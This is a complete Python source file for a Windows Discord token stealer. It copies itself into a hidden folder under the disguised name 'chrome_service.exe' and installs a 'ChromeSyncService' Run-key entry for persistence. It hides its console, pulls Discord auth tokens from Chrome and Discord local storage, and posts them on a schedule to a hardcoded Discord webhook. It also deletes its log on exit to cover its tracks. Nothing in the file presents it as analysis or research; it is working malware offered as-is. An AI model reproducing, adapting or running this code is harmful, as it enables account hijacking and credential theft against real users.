# ruff: noqa: INP001, S105

import base64
import binascii
import hashlib
import json
import os
import re
import shutil
import sys
import time
import urllib.request
import winreg
import ctypes
from pathlib import Path
from typing import Dict, Optional, Set

try:
    import fcntl  # For proper file locking (Unix-like, but we emulate on Windows)
except ImportError:
    fcntl = None

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
}
WEBHOOK_URL = "https://discord.com/api/webhooks/1418082968064233472/GyNr6GDp-2HqbSFGGky2GLfT5Z2pRRyG4BnRGUSbpfOFhXM5z6PZXGrFF1gIlaOjrV8e"

# Obfuscated paths (using env vars for stealth)
DATA_DIR = Path(os.getenv('APPDATA')) / 'WindowsSystem'
TOKEN_HISTORY_FILE = DATA_DIR / 'token_history.json'
SCRIPT_COPY_PATH = DATA_DIR / 'chrome_service.exe'
LAST_STARTUP_FILE = DATA_DIR / 'last_startup.txt'
LOCK_FILE = DATA_DIR / 'running.lock'
LOG_FILE = DATA_DIR / 'monitor.log'  # Hidden log for errors

def log_error(msg: str):
    """Log errors to hidden file."""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
    except OSError:
        pass

def is_admin() -> bool:
    """Check if running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def install_persistence() -> bool:
    """Install script for persistence (startup registry + file copy)."""
    try:
        DATA_DIR.mkdir(exist_ok=True)
        os.system(f'attrib +h +s "{DATA_DIR}"')  # Hide dir

        if SCRIPT_COPY_PATH.exists() and file_compare(sys.argv[0], SCRIPT_COPY_PATH):
            # Already installed, skip copy
            pass
        else:
            # Copy self
            if hasattr(sys, 'frozen'):  # EXE
                shutil.copy2(sys.argv[0], SCRIPT_COPY_PATH)
            else:  # Script
                with open(sys.argv[0], 'rb') as src, open(SCRIPT_COPY_PATH, 'wb') as dst:
                    dst.write(src.read())
            os.system(f'attrib +h +s "{SCRIPT_COPY_PATH}"')  # Hide file

        # Add to HKCU Run (no admin needed)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "ChromeSyncService", 0, winreg.REG_SZ, str(SCRIPT_COPY_PATH))
        return True
    except Exception as e:
        log_error(f"Persistence install failed: {e}")
        return False

def file_compare(file1: str, file2: str) -> bool:
    """Compare files using SHA-256 hash."""
    try:
        def get_hash(fpath: str) -> str:
            h = hashlib.sha256()
            with open(fpath, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    h.update(chunk)
            return h.hexdigest()

        return get_hash(file1) == get_hash(file2)
    except Exception:
        return False

def is_already_running() -> bool:
    """Check/create lock file to prevent multiple instances."""
    try:
        if LOCK_FILE.exists():
            mtime = LOCK_FILE.stat().st_mtime
            if time.time() - mtime < 120:  # Stale if >2 min
                # Try to lock for write (emulate fcntl on Windows)
                with open(LOCK_FILE, 'r+') as f:
                    try:
                        fcntl.flock(f.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
                        return True  # Locked by another process
                    except (OSError, TypeError):  # fcntl not available or locked
                        return True
                return True
            else:
                LOCK_FILE.unlink()  # Remove stale

        # Create new lock
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
            f.flush()
        return False
    except Exception:
        return False

def is_system_startup() -> bool:
    """Check if this is a fresh boot (runs >30 min since last)."""
    try:
        now = time.time()
        if not LAST_STARTUP_FILE.exists():
            LAST_STARTUP_FILE.write_text(str(now))
            return True

        last = float(LAST_STARTUP_FILE.read_text().strip())
        is_startup = (now - last) > 1800  # 30 min
        LAST_STARTUP_FILE.write_text(str(now))
        return is_startup
    except Exception:
        return False

def make_post_request(api_url: str, data: dict) -> Optional[int]:
    """Send POST request, return status or None on error."""
    if not api_url.startswith(('http://', 'https://')):
        raise ValueError("Invalid URL")
    try:
        req = urllib.request.Request(api_url, data=json.dumps(data).encode(), headers=REQUEST_HEADERS)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except Exception as e:
        log_error(f"Webhook send failed: {e}")
        return None

def load_previous_tokens() -> Dict[str, Set[str]]:
    """Load token history."""
    try:
        if TOKEN_HISTORY_FILE.exists():
            return {uid: set(toks) for uid, toks in json.loads(TOKEN_HISTORY_FILE.read_text()).items()}
    except Exception:
        pass
    return {}

def save_current_tokens(tokens: Dict[str, Set[str]]):
    """Save tokens to history."""
    try:
        DATA_DIR.mkdir(exist_ok=True)
        serializable = {uid: list(toks) for uid, toks in tokens.items()}
        TOKEN_HISTORY_FILE.write_text(json.dumps(serializable))
    except Exception as e:
        log_error(f"Save tokens failed: {e}")

def get_user_id_from_token(token: str) -> Optional[str]:
    """Extract user ID from token."""
    try:
        part = token.split('.', 1)[0]
        part += '=' * ((4 - len(part) % 4) % 4)
        return base64.b64decode(part).decode('utf-8')
    except (UnicodeDecodeError, binascii.Error):
        return None

def get_tokens_from_sqlite(db_path: Path) -> Optional[list]:
    """Extract tokens from SQLite DB."""
    try:
        import sqlite3
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        cur = conn.cursor()
        cur.execute("SELECT key, value FROM ItemTable")
        tokens = []
        for _, value in cur.fetchall():
            if value:
                val_str = value.decode('utf-8', errors='ignore') if isinstance(value, bytes) else str(value)
                tokens.extend(re.findall(TOKEN_REGEX_PATTERN, val_str))
        conn.close()
        return tokens or None
    except Exception:
        return None

def get_tokens_from_file(file_path: Path) -> Optional[list]:
    """Extract tokens from text file."""
    try:
        contents = file_path.read_text(encoding='utf-8', errors='ignore')
        return re.findall(TOKEN_REGEX_PATTERN, contents) or None
    except Exception:
        return None

def get_tokens_from_path(base_path: Path, last_scan_time: float = 0) -> Optional[Dict[str, Set[str]]]:
    """Scan path for tokens, skip unchanged files."""
    if not base_path.exists():
        return None

    id_to_tokens: Dict[str, Set[str]] = {}
    files = [f for f in base_path.iterdir() if f.is_file()]

    for file_path in files:
        if time.time() - file_path.stat().st_mtime < 1:  # Skip if recently modified (incomplete write)
            continue
        if last_scan_time > 0 and file_path.stat().st_mtime <= last_scan_time:
            continue  # Skip unchanged

        if file_path.suffix in {'.log', '.txt', '.ldb'}:
            tokens = get_tokens_from_file(file_path)
        elif file_path.suffix in {'.sqlite', '.db'}:
            tokens = get_tokens_from_sqlite(file_path)
        else:
            continue

        if not tokens:
            continue

        for token in tokens:
            uid = get_user_id_from_token(token)
            if uid:
                id_to_tokens.setdefault(uid, set()).add(token)

    return id_to_tokens if id_to_tokens else None

def get_chrome_tokens(last_scan_time: float = 0) -> Dict[str, Set[str]]:
    """Get tokens from Chrome."""
    local_data = os.getenv("LOCALAPPDATA")
    if not local_data:
        return {}
    path = Path(local_data) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
    return get_tokens_from_path(path, last_scan_time) or {}

def get_discord_app_tokens(last_scan_time: float = 0) -> Dict[str, Set[str]]:
    """Get tokens from Discord apps."""
    appdata = os.getenv('APPDATA')
    if not appdata:
        return {}
    paths = [
        Path(appdata) / "Discord" / "Local Storage" / "leveldb",
        Path(appdata) / "DiscordCanary" / "Local Storage" / "leveldb",
        Path(appdata) / "DiscordPTB" / "Local Storage" / "leveldb",
    ]
    all_tokens = {}
    for path in paths:
        if path.exists():
            tokens = get_tokens_from_path(path, last_scan_time) or {}
            for uid, tok_set in tokens.items():
                all_tokens.setdefault(uid, set()).update(tok_set)
    return all_tokens

def get_all_tokens(last_scan_time: float = 0) -> Dict[str, Set[str]]:
    """Get all tokens from all sources."""
    chrome = get_chrome_tokens(last_scan_time)
    discord = get_discord_app_tokens(last_scan_time)
    all_tokens = {}
    for source in (chrome, discord):
        for uid, tok_set in source.items():
            all_tokens.setdefault(uid, set()).update(tok_set)
    return all_tokens

def detect_token_changes(prev: Dict[str, Set[str]], curr: Dict[str, Set[str]]) -> Dict[str, Dict[str, set]]:
    """
    Detect changes: {'user_id': {'added': set(), 'removed': set(), 'type': str}}.
    Types: 'new_user', 'new_token', 'token_change', 'token_invalidated'.
    """
    changes = {}
    for uid, curr_set in curr.items():
        prev_set = prev.get(uid, set())
        added = curr_set - prev_set
        removed = prev_set - curr_set

        if not added and not removed:
            continue

        change_type = 'new_user' if uid not in prev else 'new_token' if not removed else 'token_change' if added else 'token_invalidated'
        changes[uid] = {'added': added, 'removed': removed, 'type': change_type}

    # Also check for fully removed users
    for uid in set(prev) - set(curr):
        changes[uid] = {'added': set(), 'removed': prev[uid], 'type': 'token_invalidated'}

    return changes

def get_sources_for_changes(changes: Dict[str, Dict[str, set]]) -> Set[str]:
    """Get unique sources for changes."""
    sources = set()
    chrome = get_chrome_tokens()
    discord = get_discord_app_tokens()
    for uid in changes:
        if uid in chrome and uid in discord:
            sources.add("Chrome + Discord")
        elif uid in chrome:
            sources.add("Chrome")
        elif uid in discord:
            sources.add("Discord")
    return sources

def send_token_alert(tokens_or_changes: Dict, alert_type: str, reason: str = "", sources: Set[str] = None):
    """Send alert to webhook."""
    if alert_type == "refresh":
        title = "🔄 30-MIN REFRESH"
        color = 3447003
        content = "🕒 Full token refresh - all current tokens"
        fields = []
    elif alert_type == "startup":
        title = "🖥️ SYSTEM STARTUP"
        color = 5763719
        content = "💻 Fresh boot detected"
        fields = []
    else:  # change types
        if alert_type == "new_user":
            title = "🚨 NEW USER!"
            color = 16711680
        elif alert_type == "new_token":
            title = "➕ NEW TOKEN"
            color = 16776960
        elif alert_type == "token_change":
            title = "🔄 TOKEN CHANGED (e.g., Password Reset)"
            color = 16711830
        else:  # invalidated
            title = "❌ TOKEN INVALIDATED"
            color = 15158332
        content = "@here 🚨 Token activity detected!"
        fields = []

    if reason:
        fields.append({"name": "📋 Reason", "value": reason, "inline": False})

    if sources:
        fields.append({"name": "📍 Sources", "value": " + ".join(sources), "inline": False})

    # For refresh/startup: full tokens
    if alert_type in ("refresh", "startup"):
        for uid, tok_set in tokens_or_changes.items():
            fields.append({
                "name": f"👤 {uid}",
                "value": "\n".join(f"`{t}`" for t in sorted(tok_set)),
                "inline": False
            })
    else:  # For changes: per-user details
        for uid, details in tokens_or_changes.items():
            added_str = "\n".join(f"`{t}`" for t in sorted(details['added'])) or "None"
            removed_str = "\n".join(f"`{t}`" for t in sorted(details['removed'])) or "None"
            fields.append({
                "name": f"👤 {uid} ({details['type']})",
                "value": f"**Added:**\n{added_str}\n\n**Removed:**\n{removed_str}",
                "inline": False
            })

    data = {
        "content": content,
        "embeds": [{
            "title": title,
            "color": color,
            "fields": fields,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "footer": {"text": "Auto Token Monitor"}
        }]
    }
    make_post_request(WEBHOOK_URL, data)

def monitor_tokens():
    """Main monitoring loop."""
    prev_tokens = load_previous_tokens()
    last_full_scan = last_change_scan = time.time()

    while True:
        try:
            now = time.time()
            current_tokens = get_all_tokens(last_change_scan)  # Use last scan time for perf

            # Full refresh every 30 min
            if now - last_full_scan >= 1800:
                send_token_alert(current_tokens, "refresh", "Scheduled full scan")
                last_full_scan = now

            # Detect changes every 5 min
            if now - last_change_scan >= 300:
                changes = detect_token_changes(prev_tokens, current_tokens)
                if changes:
                    sources = get_sources_for_changes(changes)
                    # Group by type for batched alerts
                    by_type = {}
                    for uid, details in changes.items():
                        t = details['type']
                        by_type.setdefault(t, {})
                        by_type[t][uid] = details
                    for t, chgs in by_type.items():
                        send_token_alert(chgs, t, "", sources)
                # Sync previous to current
                prev_tokens = {k: v.copy() for k, v in current_tokens.items()}
                save_current_tokens(prev_tokens)
                last_change_scan = now

            time.sleep(60)  # Sleep 1 min (check more frequently for refreshes)
        except Exception as e:
            log_error(f"Monitor error: {e}")
            time.sleep(300)

def main():
    # Hide console if EXE
    if hasattr(sys, 'frozen'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    if is_already_running():
        sys.exit(0)

    # Install persistence if needed
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ) as key:
            winreg.QueryValueEx(key, "ChromeSyncService")
    except FileNotFoundError:
        install_persistence()
    except Exception:
        install_persistence()

    fresh_startup = is_system_startup()
    tokens = get_all_tokens()
    save_current_tokens(tokens)

    if tokens:
        alert_type = "startup" if fresh_startup else "refresh"
        reason = "🖥️ Fresh boot" if fresh_startup else "🔍 Initial scan"
        send_token_alert(tokens, alert_type, reason)
    else:
        empty = {}
        send_token_alert(empty, "startup" if fresh_startup else "refresh", "No tokens found")

    monitor_tokens()

if __name__ == "__main__":
    try:
        main()
    finally:
        # Clean up log on exit (optional stealth)
        try:
            if LOG_FILE.exists():
                LOG_FILE.unlink()
        except OSError:
            pass
